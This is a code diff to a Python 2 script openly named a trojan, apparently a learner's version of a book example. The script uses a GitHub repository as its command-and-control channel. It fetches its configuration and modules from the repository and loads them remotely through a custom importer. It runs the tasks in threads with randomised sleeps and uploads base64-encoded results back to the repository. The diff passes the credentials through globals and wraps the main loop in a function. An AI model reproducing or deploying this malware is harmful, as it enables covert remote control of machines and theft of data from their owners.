@@ -14,6 +14,8 @@ trojan_config = "config/%s.json" % trojan_id
 data_path = "data/%s/" % trojan_id
 trojan_modules = []
 configured = False
+usr = None
+psw = None
 task_queue = Queue.Queue()
 
 
@@ -21,11 +23,14 @@ def connect_to_github(usr, pssword):
     gh = login(username=usr,password=pssword)
     repo = gh.repository(usr, "goingBlack")
     branch = repo.branch("trojanmaster") # test with a separate branch, not master
+    # github3.exceptions.NotFoundError: 404 Branch not found
+    # I guess I need to add it in advance XD
 
     return gh, repo, branch
 
 def get_file_contents(filepath):
-    gh,repo,branch = connect_to_github(None, None)
+    global usr, psw
+    gh,repo,branch = connect_to_github(usr, psw)
     tree = branch.commit.commit.tree.recurse()
 
     for filename in tree.tree:
@@ -50,7 +55,8 @@ def get_trojan_config():
 
 
 def store_module_result(data):
-    gh,repo,branch = connect_to_github(None, None)
+    global usr, psw
+    gh,repo,branch = connect_to_github(usr, psw)
     remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000,100000))
     repo.create_file(remote_path, "Commit message", base64.b64encode(data))
     return
@@ -89,19 +95,29 @@ def module_runner(module):
 
     return
 
+def main_trojan_loop():
+    # main trojan loop
+    # we first make sure to add the custom module importer!!
+    sys.meta_path = [GitImporter()]
 
-# main trojan loop
-# we first make sure to add the custom module importer!!
-sys.meta_path = [GitImporter()]
+    while True:
+        # grab configuration
+        if task_queue.empty():
+            config = get_trojan_config()
 
-while True:
-    # grab configuration
-    if task_queue.empty():
-        config = get_trojan_config()
+        for task in config:
+            t = threading.Thread(target=module_runner, args=(task['module'],))
+            t.start()
+            time.sleep(random.randint(1,10))
 
-    for task in config:
-        t = threading.Thread(target=module_runner, args=(task['module'],))
-        t.start()
-        time.sleep(random.randint(1,10))
+    time.sleep(random.randint(1000,10000))
 
-time.sleep(random.randint(1000,10000))
+if __name__ == "__main__":
+    try:
+        usr = sys.argv[1]
+        psw = sys.argv[2]
+    except IndexError:
+        print "USE: git_trojan <user> <token> "
+        sys.exit(0)
+    main_trojan_loop()
+    sys.exit(0)
